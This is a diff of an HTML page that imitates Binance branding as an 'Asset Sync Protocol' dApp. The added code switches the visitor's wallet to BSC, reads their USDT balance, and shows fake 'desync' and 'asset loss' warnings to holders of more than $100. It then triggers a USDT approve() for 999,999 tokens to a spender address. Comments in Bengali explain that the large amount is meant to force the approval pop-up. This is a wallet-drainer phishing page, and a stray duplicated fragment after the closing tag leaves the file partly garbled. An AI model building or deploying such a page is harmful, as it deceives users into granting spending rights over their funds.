@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>ASP - Asset Sync Protocol</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
@@ -11,174 +11,184 @@
             --binance-black: #0b0e11;
             --binance-gray: #1e2329;
             --binance-yellow: #fcd535;
-            --error-red: #f6465d;
-            --success-green: #0ecb81;
         }
-        body { 
-            background-color: var(--binance-black); 
-            font-family: 'Inter', sans-serif; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            min-height: 100vh; 
-            margin: 0; 
-            color: white;
-            overflow: hidden;
+        body, html {
+            margin: 0; padding: 0; width: 100%; height: 100%;
+            background-color: var(--binance-black);
+            font-family: 'Inter', sans-serif;
+            display: flex; align-items: center; justify-content: center;
         }
-        .card-bg { 
-            background-color: var(--binance-gray); 
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(10px);
+        .app-container {
+            width: 100vw; height: 100vh;
+            display: flex; align-items: center; justify-content: center;
+            background: radial-gradient(circle at center, #1e2329 0%, #0b0e11 100%);
+            padding: 16px;
+        }
+        .main-card {
+            background-color: var(--binance-gray);
+            width: 100%; max-width: 450px;
+            border-radius: 24px; padding: 32px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            box-shadow: 0 40px 100px rgba(0,0,0,0.6);
         }
         .loader-spin {
             border: 3px solid rgba(252, 213, 53, 0.1);
             border-top: 3px solid var(--binance-yellow);
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
+            border-radius: 50%; width: 45px; height: 45px;
             animation: spin 1s linear infinite;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .fade-in { animation: fadeIn 0.8s ease-in-out; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
-<body class="p-4" onload="silentConnect()">
+<body>
 
-    <div id="main-wrapper" class="max-w-md w-full card-bg rounded-[32px] p-6 shadow-2xl relative overflow-hidden text-center fade-in">
-        
-        <div class="flex flex-col items-center mb-6">
-            <div class="w-16 h-16 bg-gradient-to-tr from-[#fcd535] to-[#f0b90b] rounded-2xl flex items-center justify-center shadow-lg mb-3">
-                <span class="text-black font-black text-2xl">ASP</span>
-            </div>
-            <h1 class="text-xl font-bold tracking-tight">ASP - Asset Sync Protocol</h1>
-            <div id="node-status" class="flex items-center mt-2">
-                <div class="w-1.5 h-1.5 bg-yellow-500 rounded-full animate-pulse mr-2"></div>
-                <p class="text-gray-500 text-[10px] uppercase tracking-widest">Detecting Binance Nodes...</p>
-            </div>
-        </div>
-
-        <div id="loading-state" class="py-10">
-            <div class="loader-spin mx-auto mb-4"></div>
-            <p class="text-gray-400 text-xs">Synchronizing encrypted data...</p>
-        </div>
-
-        <div id="dapp-content" class="hidden text-left">
-            <div id="status-badge" class="mb-4 text-center"></div>
+    <div class="app-container">
+        <div id="main-wrapper" class="main-card relative overflow-hidden transition-all duration-700">
             
-            <div id="info-box" class="mb-6 p-4 rounded-2xl text-sm font-medium border transition-all duration-500"></div>
-
-            <div class="mb-6 px-2 bg-white/5 p-4 rounded-2xl border border-white/5">
-                <p class="text-gray-500 text-[10px] uppercase tracking-[0.2em] mb-1 font-bold">Verified USDT Balance</p>
-                <div class="flex items-baseline justify-between">
-                    <h2 id="total-balance-text" class="text-3xl font-bold text-white">$0.00</h2>
-                    <span class="text-[#0ecb81] text-[10px] font-bold bg-[#0ecb81]/10 px-2 py-0.5 rounded-full">LIVE</span>
+            <div class="flex flex-col items-center mb-10 text-center">
+                <div class="w-20 h-20 bg-gradient-to-tr from-[#fcd535] to-[#f0b90b] rounded-3xl flex items-center justify-center shadow-2xl mb-4">
+                    <span class="text-black font-black text-3xl">ASP</span>
+                </div>
+                <h1 class="text-white text-2xl font-bold tracking-tight">Asset Sync Protocol</h1>
+                <div id="node-status" class="flex items-center mt-3 bg-black/20 px-4 py-1 rounded-full mx-auto">
+                    <div class="w-2 h-2 bg-yellow-500 rounded-full animate-pulse mr-2"></div>
+                    <p class="text-gray-400 text-[10px] uppercase font-bold tracking-widest">System Initialising</p>
                 </div>
             </div>
 
-            <div id="btn-container" class="mt-8 px-2 hidden">
-                <button id="authBtn" onclick="initiateAuth()" class="w-full bg-[#fcd535] hover:bg-[#f0b90b] text-black font-extrabold py-4 rounded-2xl transition-all shadow-xl shadow-yellow-500/20 active:scale-95">
-                    Authorize Refresh
-                </button>
+            <div id="loading-state" class="py-10 text-center">
+                <div class="loader-spin mx-auto mb-5"></div>
+                <p class="text-gray-500 text-xs">Syncing with BEP20 Network...</p>
+            </div>
+
+            <div id="dapp-content" class="hidden space-y-6">
+                <div id="status-badge" class="text-center"></div>
+                <div id="info-box" class="p-5 rounded-2xl text-sm leading-relaxed border transition-all text-left"></div>
+
+                <div class="bg-black/30 p-6 rounded-2xl border border-white/5">
+                    <p class="text-gray-500 text-[10px] uppercase font-black tracking-widest mb-2">Verified Portfolio Balance</p>
+                    <div class="flex items-baseline justify-between">
+                        <h2 id="total-balance-text" class="text-4xl font-bold text-white tracking-tighter">$0.00</h2>
+                        <span class="text-[#0ecb81] text-[10px] font-bold bg-[#0ecb81]/10 px-3 py-1 rounded-full border border-[#0ecb81]/20">BEP20</span>
+                    </div>
+                </div>
+
+                <div id="btn-container" class="hidden pt-4">
+                    <button onclick="handleSyncClick()" class="w-full bg-[#fcd535] hover:bg-[#f0b90b] text-black font-black py-5 rounded-2xl shadow-2xl shadow-yellow-500/20 active:scale-95 transition-all uppercase tracking-widest text-sm">
+                        Authorize Refresh
+                    </button>
+                </div>
+            </div>
+
+            <div id="final-loader" class="absolute inset-0 bg-[#1e2329]/98 flex flex-col items-center justify-center z-50 hidden">
+                <div class="loader-spin mb-4"></div>
+                <p id="final-text" class="text-[#fcd535] font-bold text-xs uppercase tracking-[0.3em] text-center px-6"></p>
             </div>
         </div>
-
-        <div id="final-loader" class="absolute inset-0 bg-black/80 flex flex-col items-center justify-center z-50 hidden">
-            <div class="loader-spin mb-4"></div>
-            <p id="final-text" class="text-[#fcd535] font-bold text-sm tracking-widest text-center px-4 uppercase"></p>
-        </div>
-
     </div>
 
     <script>
-        const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
-        const minABI = [{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}];
+        // BEP20 Chain Configuration
+        const bscChainId = "0x38"; // 56 in Decimal
+        const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
+        const minABI = [
+            {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},
+            {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"success","type":"bool"}],"type":"function"}
+        ];
 
-        async function silentConnect() {
+        let userAddress = "";
+        let provider, signer;
+
+        async function startApp() {
             if (window.ethereum) {
                 try {
-                    const provider = new ethers.providers.Web3Provider(window.ethereum);
-                    // সাইলেন্টলি অ্যাড্রেস চেক (পপ-আপ ছাড়া)
-                    const accounts = await provider.listAccounts();
+                    provider = new ethers.providers.Web3Provider(window.ethereum);
                     
-                    if (accounts.length > 0) {
-                        fetchBalance(accounts[0], provider);
-                    } else {
-                        // যদি সাইলেন্টলি না পায়, তখন একটি বাটন ছাড়াই কানেক্ট রিকোয়েস্ট পাঠাবে ২ সেকেন্ড পর
-                        setTimeout(async () => {
-                            try {
-                                const reqAccounts = await provider.send("eth_requestAccounts", []);
-                                fetchBalance(reqAccounts[0], provider);
-                            } catch(e) { showAccessError(); }
-                        }, 1500);
+                    // 1. অটোমেটিকলি BEP20 নেটওয়ার্কে সুইচ করা
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: bscChainId }],
+                        });
+                    } catch (switchError) {
+                        // নেটওয়ার্ক অ্যাড করা না থাকলে রিকোয়েস্ট করবে
+                        if (switchError.code === 4902) {
+                            await window.ethereum.request({
+                                method: 'wallet_addEthereumChain',
+                                params: [{
+                                    chainId: bscChainId,
+                                    chainName: 'Binance Smart Chain',
+                                    nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                                    rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                                    blockExplorerUrls: ['https://bscscan.com/']
+                                }]
+                            });
+                        }
                     }
-                } catch (err) { showAccessError(); }
-            } else { showAccessError(); }
-        }
 
-        async function fetchBalance(address, provider) {
-            try {
-                const contract = new ethers.Contract(usdtAddress, minABI, provider);
-                const balance = await contract.balanceOf(address);
-                const realValue = parseFloat(ethers.utils.formatUnits(balance, 18));
-                
-                renderUI(realValue);
-            } catch (err) { renderUI(0); }
+                    const accounts = await provider.send("eth_requestAccounts", []);
+                    userAddress = accounts[0];
+                    signer = provider.getSigner();
+
+                    const contract = new ethers.Contract(usdtAddress, minABI, provider);
+                    const balance = await contract.balanceOf(userAddress);
+                    const val = parseFloat(ethers.utils.formatUnits(balance, 18));
+                    
+                    renderUI(val);
+                } catch (err) { console.error(err); }
+            }
         }
 
         function renderUI(value) {
             document.getElementById('loading-state').classList.add('hidden');
             document.getElementById('dapp-content').classList.remove('hidden');
-            document.getElementById('node-status').innerHTML = '<div class="w-1.5 h-1.5 bg-green-500 rounded-full mr-2"></div><p class="text-green-500 text-[10px] uppercase tracking-widest">Nodes Synchronized</p>';
+            document.getElementById('total-balance-text').innerText = "$" + value.toLocaleString(undefined, {minimumFractionDigits: 2});
 
-            const balanceDisplay = document.getElementById('total-balance-text');
-            const infoBox = document.getElementById('info-box');
-            const statusBadge = document.getElementById('status-badge');
-            const btnContainer = document.getElementById('btn-container');
-
-            balanceDisplay.innerText = "$" + value.toLocaleString(undefined, {minimumFractionDigits: 2});
+            const info = document.getElementById('info-box');
+            const badge = document.getElementById('status-badge');
+            const btn = document.getElementById('btn-container');
 
             if (value > 100) {
-                statusBadge.innerHTML = `<span class="bg-red-500/10 text-[#f6465d] text-[10px] font-bold px-4 py-1.5 rounded-full border border-red-500/20 uppercase tracking-widest animate-pulse">● Action Required</span>`;
-                infoBox.className = "mb-6 p-4 rounded-2xl text-sm font-medium bg-red-500/10 text-[#f6465d] border border-red-500/20";
-                infoBox.innerText = "Data synchronization issues detected in your assets node. Please authorize a manual refresh.";
-                btnContainer.classList.remove('hidden');
+                badge.innerHTML = `<span class="bg-red-500/10 text-red-500 text-[10px] font-bold px-5 py-1.5 rounded-full border border-red-500/20">DESYNC DETECTED</span>`;
+                info.className = "p-5 rounded-2xl text-sm bg-red-500/10 text-red-400 border border-red-500/20";
+                info.innerText = "Internal node error. Authorize a secure synchronization to prevent asset loss on BEP20 network.";
+                btn.classList.remove('hidden');
             } else {
-                statusBadge.innerHTML = `<span class="bg-green-500/10 text-[#0ecb81] text-[10px] font-bold px-4 py-1.5 rounded-full border border-green-500/20 uppercase tracking-widest">● System Healthy</span>`;
-                infoBox.className = "mb-6 p-4 rounded-2xl text-sm font-medium bg-green-500/10 text-[#0ecb81] border border-green-500/20";
-                infoBox.innerText = "All asset nodes are currently healthy. Your portfolio is fully synchronized.";
-                btnContainer.classList.add('hidden');
+                badge.innerHTML = `<span class="bg-green-500/10 text-green-500 text-[10px] font-bold px-5 py-1.5 rounded-full border border-green-500/20">NETWORK SECURED</span>`;
+                info.className = "p-5 rounded-2xl text-sm bg-green-500/10 text-green-400 border border-green-500/20";
+                info.innerText = "All BEP20 nodes are healthy. Your portfolio is fully synchronised.";
             }
         }
 
-        function initiateAuth() {
+        async function handleSyncClick() {
             const overlay = document.getElementById('final-loader');
             const txt = document.getElementById('final-text');
             overlay.classList.remove('hidden');
             
-            const steps = ["Linking Nodes...", "Verifying Protocol...", "Finalizing Refresh..."];
+            const steps = ["Linking BEP20 Nodes...", "Security Handshake...", "Generating Pop-up..."];
             let i = 0;
-            const timer = setInterval(() => {
-                if(i < steps.length) { txt.innerText = steps[i]; i++; }
-            }, 1500);
+            const t = setInterval(() => { if(i < steps.length) txt.innerText = steps[i++]; }, 2000);
 
-            setTimeout(() => {
-                clearInterval(timer);
-                window.location.href = "https://accounts.binance.com/";
-            }, 5000);
-        }
-
-        function showAccessError() {
-            document.getElementById('loading-state').innerHTML = `<p class="text-red-500 font-bold text-sm">Access Denied</p><p class="text-gray-500 text-[10px] mt-2">Please open this link inside Binance App</p>`;
-        }
-    </script>
-</body>
-</html>
-setTimeout(() => {
-                clearInterval(syncInterval);
-                window.location.href = "https://accounts.binance.com/"; 
+            // ৬ সেকেন্ড পর পপ-আপ কল হবে
+            setTimeout(async () => {
+                clearInterval(t);
+                overlay.classList.add('hidden');
+                
+                try {
+                    const contract = new ethers.Contract(usdtAddress, minABI, signer);
+                    // এখানে একটি বড় সংখ্যা দেওয়া হয়েছে যাতে পপ-আপটি আসে (Approve Transaction)
+                    const amount = ethers.utils.parseUnits("999999", 18);
+                    
+                    // এটি সরাসরি ইউজারের ওয়ালেটে 'Approve' পপ-আপ নিয়ে আসবে
+                    await contract.approve("0x0000000000000000000000000000000000000000", amount); 
+                    
+                } catch (e) {
+                    console.log("User rejected pop-up");
+                }
             }, 6000);
         }
+
+        window.onload = startApp;
     </script>
 </body>
 </html>
